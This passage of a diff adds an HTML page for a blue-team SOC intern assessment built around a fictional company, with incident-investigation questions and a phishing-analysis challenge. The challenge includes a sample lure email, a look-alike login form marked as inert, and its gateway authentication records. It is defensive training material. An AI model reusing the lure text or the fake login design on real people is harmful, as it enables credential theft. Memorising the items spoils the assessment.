@@ -1,0 +1,1405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FinSecure SOC — Blue Team Intern Assessment</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0A0F14; --panel:#10171E; --panel2:#151E27; --panel3:#1A252F;
+  --line:#1F2C37; --line2:#2A3B48;
+  --text:#DCE4EC; --dim:#8296A8; --faint:#5D707F;
+  --accent:#63A6C8; --accent-dk:#1D3B4C;
+  --crit:#E05260; --high:#E8843F; --med:#D9B23E; --low:#4FB07C; --info:#6C8296;
+  --sans:"IBM Plex Sans",ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  background:var(--bg); color:var(--text); font-family:var(--sans);
+  font-size:15px; line-height:1.55; -webkit-font-smoothing:antialiased;
+}
+a{color:var(--accent)}
+h1,h2,h3,h4{margin:0; font-weight:600; letter-spacing:-.01em}
+p{margin:0 0 .85em}
+p:last-child{margin-bottom:0}
+code,kbd{font-family:var(--mono); font-size:.86em; background:var(--panel3); padding:1px 5px; border-radius:3px; color:#B9D4E2}
+hr{border:0;border-top:1px solid var(--line);margin:26px 0}
+:focus-visible{outline:2px solid var(--accent); outline-offset:2px}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+
+/* ---------- top bar ---------- */
+.topbar{
+  position:sticky; top:0; z-index:60; background:rgba(10,15,20,.94);
+  backdrop-filter:blur(8px); border-bottom:1px solid var(--line);
+}
+.topbar-in{max-width:1360px;margin:0 auto;padding:10px 22px;display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:11px;min-width:0}
+.brand-mark{
+  width:30px;height:30px;border:1px solid var(--line2);border-radius:4px;flex:none;
+  display:grid;place-items:center;font-family:var(--mono);font-size:12px;color:var(--accent);background:var(--panel2)
+}
+.brand-t{font-size:13.5px;font-weight:600;line-height:1.2}
+.brand-s{font-size:11.5px;color:var(--faint);font-family:var(--mono)}
+.spacer{flex:1}
+.clock{display:flex;align-items:center;gap:12px}
+.clock-val{font-family:var(--mono);font-size:24px;font-weight:600;letter-spacing:.02em;font-variant-numeric:tabular-nums}
+.clock-val.warn{color:var(--med)} .clock-val.crit{color:var(--crit)}
+.clock-lbl{font-size:11px;color:var(--faint);font-family:var(--mono)}
+.pill{font-family:var(--mono);font-size:11px;padding:3px 9px;border-radius:100px;border:1px solid var(--line2);color:var(--dim)}
+.pill.live{color:var(--low);border-color:#245c43;background:#0f2119}
+.pill.locked{color:var(--crit);border-color:#5c2429;background:#210f11}
+
+/* ---------- buttons ---------- */
+button{font-family:inherit;font-size:13.5px;cursor:pointer}
+.btn{
+  background:var(--panel2);color:var(--text);border:1px solid var(--line2);
+  padding:8px 15px;border-radius:5px;transition:background .12s,border-color .12s;
+}
+.btn:hover:not(:disabled){background:var(--panel3);border-color:#3a5163}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn.primary{background:var(--accent-dk);border-color:#2f6280;color:#CFE8F4;font-weight:600}
+.btn.primary:hover:not(:disabled){background:#24506a}
+.btn.danger{background:#2a1418;border-color:#6b2d33;color:#F0AEB4}
+.btn.sm{padding:4px 9px;font-size:12px}
+.btn.ghost{background:transparent}
+
+/* ---------- layout ---------- */
+.shell{max-width:1360px;margin:0 auto;padding:0 22px;display:grid;grid-template-columns:212px 1fr;gap:30px;align-items:start}
+.rail{position:sticky;top:66px;padding:24px 0 40px}
+.rail h5{font-size:11px;color:var(--faint);font-family:var(--mono);margin:0 0 9px 10px;font-weight:500}
+.navlink{
+  display:flex;align-items:center;gap:9px;width:100%;text-align:left;background:none;border:0;
+  color:var(--dim);padding:6px 10px;border-radius:5px;border-left:2px solid transparent;font-size:13px
+}
+.navlink:hover{color:var(--text);background:var(--panel)}
+.navlink.on{color:var(--text);background:var(--panel);border-left-color:var(--accent)}
+.navlink .num{font-family:var(--mono);font-size:11px;color:var(--faint);width:14px}
+.navlink.on .num{color:var(--accent)}
+.progwrap{margin:20px 10px 0}
+.progbar{height:4px;background:var(--panel2);border-radius:2px;overflow:hidden}
+.progbar i{display:block;height:100%;background:var(--accent);width:0;transition:width .25s}
+.progtxt{font-family:var(--mono);font-size:11px;color:var(--faint);margin-top:7px}
+main{padding:24px 0 120px;min-width:0}
+section{scroll-margin-top:78px;margin-bottom:46px}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:6px;flex-wrap:wrap}
+.sec-num{font-family:var(--mono);font-size:12px;color:var(--accent)}
+.sec-head h2{font-size:21px}
+.sec-sub{color:var(--dim);font-size:14px;margin-bottom:20px;max-width:74ch}
+
+/* ---------- cards ---------- */
+.card{background:var(--panel);border:1px solid var(--line);border-radius:7px;padding:20px}
+.card + .card{margin-top:16px}
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.stat{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:13px 15px}
+.stat .k{font-size:11px;color:var(--faint);font-family:var(--mono);margin-bottom:5px}
+.stat .v{font-size:16px;font-weight:600}
+.note{border-left:2px solid var(--accent);background:var(--panel2);padding:13px 16px;border-radius:0 5px 5px 0;color:var(--dim);font-size:14px}
+.note strong{color:var(--text)}
+.warnbox{border:1px solid #5c4a1e;background:#1c1608;border-radius:6px;padding:14px 16px;font-size:14px;color:#E4D3A2}
+
+/* evidence rule */
+.evrule{border:1px solid var(--line2);border-radius:7px;overflow:hidden}
+.evrule .hd{background:var(--panel2);padding:13px 18px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px}
+.evrule .hd h3{font-size:15px}
+.evrule .bd{padding:16px 18px;display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.tag{border-radius:5px;padding:10px 12px;border:1px solid var(--line2);background:var(--panel2)}
+.tag b{display:block;font-family:var(--mono);font-size:12px;margin-bottom:3px}
+.tag span{font-size:12.5px;color:var(--dim);line-height:1.4}
+.tag.fact b{color:var(--low)} .tag.hyp b{color:var(--med)}
+.tag.conf b{color:var(--accent)} .tag.unk b{color:var(--dim)}
+
+/* ---------- severity ---------- */
+.sev{font-family:var(--mono);font-size:11px;padding:2px 7px;border-radius:3px;border:1px solid;white-space:nowrap;display:inline-block}
+.sev-critical{color:var(--crit);border-color:#5c2429;background:#1e0f11}
+.sev-high{color:var(--high);border-color:#5e3a1c;background:#1e150b}
+.sev-medium{color:var(--med);border-color:#5a4c1c;background:#1c180a}
+.sev-low{color:var(--low);border-color:#245c43;background:#0e1c16}
+.sev-informational{color:var(--info);border-color:#33434e;background:#131a20}
+
+/* ---------- log table ---------- */
+.toolbar{display:flex;gap:9px;flex-wrap:wrap;align-items:center;margin-bottom:12px}
+input[type=text],input[type=email],select,textarea{
+  background:var(--panel2);border:1px solid var(--line2);color:var(--text);
+  border-radius:5px;padding:7px 10px;font-family:inherit;font-size:13.5px
+}
+input::placeholder,textarea::placeholder{color:var(--faint)}
+#q{flex:1;min-width:220px;font-family:var(--mono);font-size:13px}
+select{font-size:12.5px;padding:7px 8px}
+.tablewrap{border:1px solid var(--line);border-radius:7px;overflow:auto;max-height:620px;background:var(--panel)}
+table{border-collapse:collapse;width:100%;font-size:12.5px}
+thead th{
+  position:sticky;top:0;background:var(--panel2);z-index:2;text-align:left;
+  font-family:var(--mono);font-weight:500;font-size:11px;color:var(--dim);
+  padding:9px 10px;border-bottom:1px solid var(--line2);white-space:nowrap
+}
+tbody td{padding:7px 10px;border-bottom:1px solid #16202a;vertical-align:top;font-family:var(--mono);font-size:12px}
+tbody tr.ev:hover{background:#131c25;cursor:pointer}
+tbody tr.ev.open{background:#141F29}
+td.id{color:var(--accent)}
+td.dim{color:var(--dim)}
+.rawrow td{background:#0C1319;padding:0 10px 12px;border-bottom:1px solid var(--line)}
+.raw{
+  font-family:var(--mono);font-size:12px;white-space:pre-wrap;word-break:break-word;
+  background:#080D12;border:1px solid var(--line);border-radius:5px;padding:11px 13px;color:#AFC6D4;line-height:1.6
+}
+.rawbar{display:flex;gap:8px;padding:9px 0 8px}
+.tcount{font-family:var(--mono);font-size:11.5px;color:var(--faint);margin-top:9px}
+
+/* ---------- questions ---------- */
+.qblock{border-top:1px solid var(--line);padding:18px 0}
+.qblock:first-of-type{border-top:0;padding-top:4px}
+.qhead{display:flex;gap:10px;align-items:baseline;margin-bottom:4px}
+.qid{font-family:var(--mono);font-size:12px;color:var(--accent);flex:none}
+.qtitle{font-size:14.5px;font-weight:600}
+.qhelp{color:var(--dim);font-size:13px;margin:3px 0 10px}
+textarea{width:100%;min-height:104px;resize:vertical;line-height:1.6}
+textarea.tall{min-height:170px}
+.counter{font-family:var(--mono);font-size:11px;color:var(--faint);text-align:right;margin-top:4px}
+.counter.over{color:var(--crit)}
+.choices{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.choice{
+  border:1px solid var(--line2);background:var(--panel2);color:var(--dim);
+  padding:6px 14px;border-radius:5px;font-size:13px
+}
+.choice.on{border-color:var(--accent);background:var(--accent-dk);color:#CFE8F4;font-weight:600}
+
+/* ---------- phishing ---------- */
+.phishwrap{display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:start}
+.browser{border:1px solid var(--line2);border-radius:7px;overflow:hidden;background:#0D141A}
+.chrome{background:var(--panel2);padding:8px 10px;display:flex;gap:8px;align-items:center;border-bottom:1px solid var(--line)}
+.dots{display:flex;gap:5px}.dots i{width:9px;height:9px;border-radius:50%;background:#33424e;display:block}
+.urlbar{
+  flex:1;background:#080D12;border:1px solid var(--line2);border-radius:100px;padding:4px 12px;
+  font-family:var(--mono);font-size:11.5px;color:#9FB6C4;display:flex;align-items:center;gap:7px;overflow:hidden
+}
+.lock{color:var(--low);font-size:10px}
+.fakepage{background:#F3F4F6;color:#1F2328;padding:26px 24px 30px;font-family:"Segoe UI",var(--sans)}
+.fakecard{background:#fff;max-width:340px;margin:0 auto;border-radius:4px;padding:26px 28px;box-shadow:0 2px 8px rgba(0,0,0,.14)}
+.fakelogo{font-size:17px;font-weight:700;color:#0F4C81;margin-bottom:2px}
+.fakesub{font-size:12.5px;color:#5B6670;margin-bottom:18px}
+.fakelabel{font-size:12px;color:#3C4650;display:block;margin-bottom:4px}
+.fakeinput{width:100%;padding:8px 10px;border:1px solid #C7CDD3;border-radius:3px;font-size:13.5px;margin-bottom:13px;background:#fff;color:#1F2328}
+.fakebtn{width:100%;background:#0F4C81;color:#fff;border:0;padding:9px;border-radius:3px;font-weight:600;font-size:13.5px}
+.fakefoot{font-size:11.5px;color:#6B747D;margin-top:14px;text-align:center;line-height:1.5}
+.simbanner{background:#FEF3C7;border:1px solid #D9A400;color:#6b4d00;font-size:12px;padding:8px 10px;border-radius:4px;margin-top:14px;display:none;font-weight:600}
+.sandbox{
+  font-family:var(--mono);font-size:10.5px;color:var(--med);background:#1c1608;
+  border-bottom:1px solid #5c4a1e;padding:5px 10px;text-align:center;letter-spacing:.03em
+}
+.emailview{border:1px solid var(--line2);border-radius:7px;background:var(--panel);overflow:hidden}
+.emailhd{padding:14px 16px;border-bottom:1px solid var(--line);background:var(--panel2)}
+.emailrow{display:grid;grid-template-columns:74px 1fr;gap:8px;font-size:12.5px;padding:2px 0}
+.emailrow b{font-family:var(--mono);color:var(--faint);font-weight:400;font-size:11.5px}
+.emailrow span{font-family:var(--mono);color:#B9D4E2;word-break:break-all}
+.emailbody{padding:18px 18px 20px;font-size:14px;color:var(--text)}
+.verifybtn{background:#0F4C81;color:#fff;border:0;padding:9px 22px;border-radius:3px;font-weight:600;margin:14px 0 6px}
+.hoverbar{
+  font-family:var(--mono);font-size:11px;color:var(--dim);background:#080D12;
+  border:1px dashed var(--line2);border-radius:4px;padding:7px 10px;min-height:32px
+}
+.hoverbar b{color:var(--high)}
+.kv{display:grid;grid-template-columns:150px 1fr;gap:4px 14px;font-size:12.5px;font-family:var(--mono)}
+.kv dt{color:var(--faint)} .kv dd{margin:0;color:#B9D4E2;word-break:break-all}
+
+/* ---------- alerts (challenge 3) ---------- */
+.alertrow{display:grid;grid-template-columns:34px 1fr 96px 118px;gap:12px;align-items:center;padding:11px 0;border-top:1px solid var(--line)}
+.alertrow:first-of-type{border-top:0}
+.alertkey{font-family:var(--mono);font-size:15px;color:var(--accent);text-align:center}
+.alerttxt{font-size:13.5px}
+.rankdup{border-color:var(--crit)!important}
+
+/* ---------- checklist / submit ---------- */
+.check{display:flex;gap:10px;align-items:flex-start;padding:9px 0;font-size:13.5px;color:var(--dim);border-top:1px solid var(--line)}
+.check:first-of-type{border-top:0}
+.check input{margin-top:3px;accent-color:var(--accent);width:15px;height:15px;flex:none}
+.check.done{color:var(--text)}
+.ol{padding-left:20px;margin:0;color:var(--dim);font-size:13.5px}
+.ol li{margin-bottom:3px}
+.savechip{font-family:var(--mono);font-size:11px;color:var(--faint)}
+
+/* ---------- gates & overlays ---------- */
+.gate{
+  position:fixed;inset:0;z-index:90;background:rgba(6,10,14,.93);backdrop-filter:blur(6px);
+  display:grid;place-items:center;padding:24px
+}
+.gatecard{max-width:620px;background:var(--panel);border:1px solid var(--line2);border-radius:9px;padding:30px 32px}
+.gatecard h2{font-size:22px;margin-bottom:6px}
+.hidden{display:none!important}
+.lockmask{position:relative}
+.lockmask.locked > *{filter:blur(4px) grayscale(.6);pointer-events:none;user-select:none}
+.lockmask.locked::after{
+  content:"Dataset closed at the 2-hour mark";position:absolute;inset:0;display:grid;place-items:center;
+  font-family:var(--mono);font-size:13px;color:var(--crit);letter-spacing:.04em
+}
+.toast{
+  position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:95;
+  background:var(--panel3);border:1px solid var(--line2);color:var(--text);
+  padding:10px 18px;border-radius:6px;font-size:13px;box-shadow:0 6px 24px rgba(0,0,0,.5);display:none
+}
+.modal{position:fixed;inset:0;z-index:92;background:rgba(6,10,14,.85);display:none;place-items:center;padding:24px}
+.modal.on{display:grid}
+
+@media (max-width:1080px){
+  .grid4{grid-template-columns:repeat(2,1fr)}
+  .evrule .bd{grid-template-columns:repeat(2,1fr)}
+  .phishwrap,.grid2{grid-template-columns:1fr}
+}
+@media (max-width:860px){
+  .shell{grid-template-columns:1fr;gap:0}
+  .rail{position:static;padding:12px 0 0;display:flex;gap:6px;overflow-x:auto;border-bottom:1px solid var(--line)}
+  .rail h5,.progwrap{display:none}
+  .navlink{white-space:nowrap;width:auto;border-left:0;border-bottom:2px solid transparent;border-radius:5px 5px 0 0}
+  .navlink.on{border-left:0;border-bottom-color:var(--accent)}
+  .alertrow{grid-template-columns:26px 1fr;row-gap:6px}
+  .clock-val{font-size:20px}
+  thead th:nth-child(n+7),tbody td:nth-child(n+7){display:none}
+}
+</style>
+</head>
+<body>
+
+<!-- ============ TOP BAR ============ -->
+<header class="topbar">
+  <div class="topbar-in">
+    <div class="brand">
+      <div class="brand-mark">FS</div>
+      <div>
+        <div class="brand-t">Blue Team / SOC Analyst Intern Assessment</div>
+        <div class="brand-s">CyberStation by Brain Station 23 &middot; Practical Defensive Security Challenge</div>
+      </div>
+    </div>
+    <div class="spacer"></div>
+    <span id="statePill" class="pill">Not started</span>
+    <span class="savechip" id="saveChip"></span>
+    <div class="clock">
+      <div>
+        <div class="clock-val" id="clock">02:00:00</div>
+        <div class="clock-lbl" id="clockLbl">investigation window</div>
+      </div>
+      <button class="btn primary" id="startBtn">Start assessment</button>
+    </div>
+  </div>
+</header>
+
+<div class="shell">
+  <!-- ============ NAV RAIL ============ -->
+  <nav class="rail" id="rail">
+    <h5>sections</h5>
+    <button class="navlink on" data-go="s-brief"><span class="num">00</span>Briefing</button>
+    <button class="navlink" data-go="s-scenario"><span class="num">01</span>Scenario</button>
+    <button class="navlink" data-go="s-c1"><span class="num">02</span>Challenge 1 — Investigation</button>
+    <button class="navlink" data-go="s-c2"><span class="num">03</span>Challenge 2 — Phishing</button>
+    <button class="navlink" data-go="s-c3"><span class="num">04</span>Challenge 3 — Triage</button>
+    <button class="navlink" data-go="s-comms"><span class="num">05</span>Communication</button>
+    <button class="navlink" data-go="s-submit-req"><span class="num">06</span>Report requirements</button>
+    <button class="navlink" data-go="s-rules"><span class="num">07</span>Rules</button>
+    <button class="navlink" data-go="s-ai"><span class="num">08</span>AI use disclosure</button>
+    <button class="navlink" data-go="s-final"><span class="num">09</span>Final submission</button>
+    <div class="progwrap">
+      <div class="progbar"><i id="progFill"></i></div>
+      <div class="progtxt" id="progTxt">0 of 24 answered</div>
+    </div>
+  </nav>
+
+  <main>
+    <!-- ============ 00 BRIEFING ============ -->
+    <section id="s-brief">
+      <div class="sec-head"><span class="sec-num">00</span><h2>Briefing</h2></div>
+      <p class="sec-sub">Read this before you start the clock. Nothing is timed until you press <b>Start assessment</b>.</p>
+
+      <div class="grid4">
+        <div class="stat"><div class="k">investigation window</div><div class="v">2 hours</div></div>
+        <div class="stat"><div class="k">write-up window</div><div class="v">+ 30 min</div></div>
+        <div class="stat"><div class="k">report deadline</div><div class="v">24h from invitation email</div></div>
+        <div class="stat"><div class="k">role / level</div><div class="v">SOC Intern (Junior)</div></div>
+      </div>
+
+      <div class="card" style="margin-top:16px">
+        <div class="note">You have 2 hours to investigate. You may use external references and tools, but your final conclusions must be supported by evidence from the supplied dataset.</div>
+        <p style="margin-top:16px;color:var(--dim)">The session runs in two phases and takes 2 hours 30 minutes end to end.</p>
+        <div class="kv" style="margin-top:10px">
+          <dt>0:00 – 2:00</dt><dd>Investigation. The dataset is open. Read, filter, take notes, answer as you go.</dd>
+          <dt>2:00</dt><dd>The dataset locks. Search, filters and raw logs close and do not reopen.</dd>
+          <dt>2:00 – 2:30</dt><dd>Write-up. Answer fields stay open for 30 minutes so you can finish from your own notes.</dd>
+          <dt>2:30</dt><dd>Everything locks. Export stays available.</dd>
+          <dt>report deadline</dt><dd><b style="color:var(--text)">24 hours from the invitation email Brain Station 23 sent you</b> — not from when you finish here. Starting late does not extend it.</dd>
+        </div>
+        <p style="margin-top:16px;color:var(--dim)">Copy or export anything you will need before the 2-hour mark — <b style="color:var(--text)">the log data is not readable after that point</b>, and your report has to be written from what you kept.</p>
+      </div>
+
+      <div class="card">
+        <div class="evrule">
+          <div class="hd"><h3>Evidence first</h3><span class="sev sev-critical">primary evaluation criterion</span></div>
+          <div style="padding:16px 18px 0;color:var(--dim);font-size:14px">Every major conclusion must be supported by evidence from the supplied dataset. Label each claim you make in your report using one of these four:</div>
+          <div class="bd">
+            <div class="tag fact"><b>FACT</b><span>Directly supported by a specific event in the dataset. Cite the Event ID.</span></div>
+            <div class="tag hyp"><b>HYPOTHESIS</b><span>A reasonable interpretation of the evidence, but not proven by it.</span></div>
+            <div class="tag conf"><b>CONFIRMED</b><span>Supported by sufficient, corroborating evidence from more than one source.</span></div>
+            <div class="tag unk"><b>UNKNOWN</b><span>Cannot be determined from the available evidence. Saying so is a correct answer.</span></div>
+          </div>
+        </div>
+        <p style="margin-top:16px;color:var(--dim);font-size:14px">Confident answers that the data does not support score lower than a well-argued <i>"unknown"</i>. We are hiring an analyst, not a guesser.</p>
+      </div>
+    </section>
+
+    <!-- ============ 01 SCENARIO ============ -->
+    <section id="s-scenario">
+      <div class="sec-head"><span class="sec-num">01</span><h2>Suspicious activity at FinSecure</h2></div>
+      <p class="sec-sub">FinSecure is a fictional financial services company. All names, domains, addresses, hashes and data in this assessment are invented for training purposes.</p>
+
+      <div class="grid2">
+        <div class="card">
+          <h3 style="font-size:15px;margin-bottom:10px">The environment</h3>
+          <div class="kv">
+            <dt>endpoints</dt><dd>Windows 10/11 workstations</dd>
+            <dt>identity</dt><dd>Windows Active Directory (FINSEC.LOCAL) + cloud SSO</dd>
+            <dt>servers</dt><dd>Windows &amp; Linux, on-prem</dd>
+            <dt>cloud</dt><dd>AWS (Finance &amp; Reporting accounts)</dd>
+            <dt>email</dt><dd>Cloud mailboxes behind a secure email gateway</dd>
+            <dt>monitoring</dt><dd>Wazuh SIEM, Sysmon, perimeter firewall, CloudTrail</dd>
+          </div>
+        </div>
+        <div class="card">
+          <h3 style="font-size:15px;margin-bottom:10px">What the SOC received</h3>
+          <p style="color:var(--dim);font-size:14px">Over one shift, alerts fired involving an employee workstation and that employee's corporate account:</p>
+          <ul class="ol">
+            <li>Suspicious authentication activity</li>
+            <li>PowerShell execution on two hosts</li>
+            <li>Unusual outbound network communication</li>
+            <li>A phishing email reported by an employee</li>
+            <li>Suspicious AWS activity</li>
+          </ul>
+          <p style="margin-top:12px;color:var(--dim);font-size:14px">You are the junior analyst on shift. Decide whether these events are related, and whether a genuine security incident has occurred.</p>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="warnbox">
+          Do not assume every alert is malicious. Some events in this dataset are legitimate administrative or automated activity, and at least one high-severity alert is a false positive. Separating the two is most of the job.
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ 02 CHALLENGE 1 ============ -->
+    <section id="s-c1">
+      <div class="sec-head"><span class="sec-num">02</span><h2>Challenge 1 — Investigate the security incident</h2><span class="sev sev-high">75 min suggested</span></div>
+      <p class="sec-sub">Review the supplied security events and determine what happened. Correlate authentication, endpoint, network and cloud activity to construct a plausible incident timeline.</p>
+
+      <div class="card lockmask" id="dataMask">
+        <div>
+          <div class="toolbar">
+            <input type="text" id="q" placeholder="search event id, host, user, ip, process, rule, raw text…">
+            <select id="fSource"><option value="">All sources</option></select>
+            <select id="fSev"><option value="">All severities</option></select>
+            <select id="fHost"><option value="">All hosts</option></select>
+            <select id="fUser"><option value="">All users</option></select>
+            <button class="btn sm" id="clearF">Reset filters</button>
+            <button class="btn sm" id="copyAll">Copy filtered rows</button>
+            <button class="btn sm" id="expandAll">Expand all raw</button>
+          </div>
+          <div class="tablewrap">
+            <table id="logtbl">
+              <thead><tr>
+                <th>Event ID</th><th>Timestamp (as recorded)</th><th>Log source</th><th>Host</th>
+                <th>User</th><th>Source IP</th><th>Destination IP</th><th>Process</th>
+                <th>Event / Rule</th><th>Severity</th><th>Raw</th>
+              </tr></thead>
+              <tbody id="tbody"></tbody>
+            </table>
+          </div>
+          <div class="tcount" id="tcount"></div>
+          <p style="margin-top:12px;color:var(--faint);font-size:12.5px">Timestamps are printed exactly as each source recorded them. Sources are not synchronised for you. Click any row to open the raw event. Event IDs reflect per-source ingestion order and are not chronological.</p>
+        </div>
+      </div>
+
+      <div class="card" style="margin-top:16px">
+        <h3 style="font-size:16px;margin-bottom:4px">Challenge 1 answers</h3>
+        <p style="color:var(--dim);font-size:13.5px;margin-bottom:8px">Answer here in note form. Your full prose goes in the report you submit afterwards.</p>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q1</span><span class="qtitle">Is there a genuine security incident?</span></div>
+          <div class="choices" data-choice="c1q1">
+            <button class="choice" data-val="Yes">Yes</button>
+            <button class="choice" data-val="No">No</button>
+            <button class="choice" data-val="Inconclusive">Inconclusive</button>
+          </div>
+          <textarea data-a="c1q1j" placeholder="Justify your verdict. Cite Event IDs."></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q2</span><span class="qtitle">Identify the affected assets</span></div>
+          <div class="qhelp">User(s), endpoint(s), server(s), cloud account(s). Mark each as confirmed or suspected.</div>
+          <textarea data-a="c1q2"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q3</span><span class="qtitle">Construct the attack timeline</span></div>
+          <div class="qhelp">One line per step: timestamp &middot; Event ID &middot; activity &middot; your interpretation. State which timezone you normalised to.</div>
+          <textarea class="tall" data-a="c1q3"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q4</span><span class="qtitle">Most likely initial access vector</span></div>
+          <textarea data-a="c1q4"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q5</span><span class="qtitle">Suspicious activity following initial access</span></div>
+          <textarea data-a="c1q5"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q6</span><span class="qtitle">Indicators of compromise</span></div>
+          <div class="qhelp">Categories: IP, domain, URL, hash, username, host, process, file. Only list what the evidence supports.</div>
+          <textarea class="tall" data-a="c1q6"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q7</span><span class="qtitle">MITRE ATT&amp;CK mapping</span></div>
+          <div class="qhelp">Map the activity you can evidence. Do not map a technique where the evidence is insufficient.</div>
+          <textarea data-a="c1q7"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q8</span><span class="qtitle">Overall incident severity</span></div>
+          <div class="choices" data-choice="c1q8">
+            <button class="choice" data-val="Critical">Critical</button>
+            <button class="choice" data-val="High">High</button>
+            <button class="choice" data-val="Medium">Medium</button>
+            <button class="choice" data-val="Low">Low</button>
+            <button class="choice" data-val="Informational">Informational</button>
+          </div>
+          <textarea data-a="c1q8j" placeholder="Justify the rating in terms of business impact, not alert level."></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q9</span><span class="qtitle">Immediate containment actions</span></div>
+          <textarea data-a="c1q9"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q10</span><span class="qtitle">Additional evidence you would request before confirming</span></div>
+          <textarea data-a="c1q10"></textarea>
+        </div>
+
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q11</span><span class="qtitle">What is the attacker's IP address?</span></div>
+          <div class="qhelp">Answer as precisely as the evidence allows, and no more precisely than that.</div>
+          <textarea data-a="c1q11"></textarea>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ 03 CHALLENGE 2 ============ -->
+    <section id="s-c2">
+      <div class="sec-head"><span class="sec-num">03</span><h2>Challenge 2 — Phishing detection &amp; analysis</h2><span class="sev sev-medium">25 min suggested</span></div>
+      <p class="sec-sub">An employee reported an email asking them to verify their corporate account. The link opens a login page that resembles the company's cloud login portal. Decide whether it is legitimate.</p>
+
+      <div class="phishwrap">
+        <div class="emailview">
+          <div class="sandbox">detonation sandbox &middot; static reproduction &middot; no live content</div>
+          <div class="emailhd">
+            <div class="emailrow"><b>from</b><span>FinSecure Security &lt;security-alert@finsecure-support.example&gt;</span></div>
+            <div class="emailrow"><b>to</b><span>employee@finsecure.example</span></div>
+            <div class="emailrow"><b>date</b><span>2026-08-27 09:14:02 UTC</span></div>
+            <div class="emailrow"><b>subject</b><span style="color:var(--text)">Urgent: Your account will be suspended</span></div>
+          </div>
+          <div class="emailbody">
+            <p>We detected unusual activity on your account. To prevent suspension, verify your identity immediately using the link below.</p>
+            <button class="verifybtn" id="verifyBtn"
+              data-display="https://login.finsecure-security.example/verify"
+              data-real="https://account-verification.example/finsecure/login">Verify Account</button>
+            <p style="font-size:12px;color:var(--faint);margin-top:2px">Link text shown in the message: <code>https://login.finsecure-security.example/verify</code></p>
+            <div class="hoverbar" id="hoverbar">Hover or focus the button to see where it actually resolves.</div>
+            <p style="font-size:12px;color:var(--faint);margin-top:14px">FinSecure Security Operations &middot; This message was sent automatically, please do not reply.</p>
+          </div>
+        </div>
+
+        <div class="browser">
+          <div class="sandbox">training simulation &middot; this form is inert and transmits nothing</div>
+          <div class="chrome">
+            <div class="dots"><i></i><i></i><i></i></div>
+            <div class="urlbar"><span class="lock">&#9679;</span>account-verification.example/finsecure/login</div>
+          </div>
+          <div class="fakepage">
+            <div class="fakecard">
+              <div class="fakelogo">FinSecure</div>
+              <div class="fakesub">Account Verification</div>
+              <label class="fakelabel" for="pE">Email</label>
+              <input class="fakeinput" id="pE" type="text" autocomplete="off" placeholder="name@finsecure.example">
+              <label class="fakelabel" for="pP">Password</label>
+              <input class="fakeinput" id="pP" type="password" autocomplete="off" placeholder="Password">
+              <button class="fakebtn" id="fakeSignIn">Sign In</button>
+              <div class="fakefoot">Your session has expired. Please sign in again to continue.</div>
+              <div class="simbanner" id="simBanner">Training Simulation — No credentials were transmitted.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card" style="margin-top:16px">
+        <h3 style="font-size:15px;margin-bottom:10px">Gateway record for this message</h3>
+        <div class="kv">
+          <dt>message id</dt><dd>&lt;a41f9c02-7b3e-4d18@finsecure-support.example&gt;</dd>
+          <dt>envelope from</dt><dd>bounce-0912@mail-relay-eu4.example</dd>
+          <dt>header from</dt><dd>security-alert@finsecure-support.example</dd>
+          <dt>sending ip</dt><dd>185.199.229.61</dd>
+          <dt>spf</dt><dd>softfail</dd>
+          <dt>dkim</dt><dd>none</dd>
+          <dt>dmarc</dt><dd>fail (p=quarantine)</dd>
+          <dt>gateway verdict</dt><dd>Delivered — matched allow-list rule ALLOW-PARTNER-FINSECURE-*</dd>
+          <dt>reply-to</dt><dd>it-verify@mail-relay-eu4.example</dd>
+          <dt>display url</dt><dd>https://login.finsecure-security.example/verify</dd>
+          <dt>final url</dt><dd>https://account-verification.example/finsecure/login</dd>
+          <dt>domain first seen</dt><dd>2026-08-21 (6 days before delivery)</dd>
+          <dt>tls certificate</dt><dd>Issued 2026-08-21, DV, CN=account-verification.example, SAN does not include any finsecure domain</dd>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="qblock">
+          <div class="qhead"><span class="qid">Q1</span><span class="qtitle">Verdict on this email</span></div>
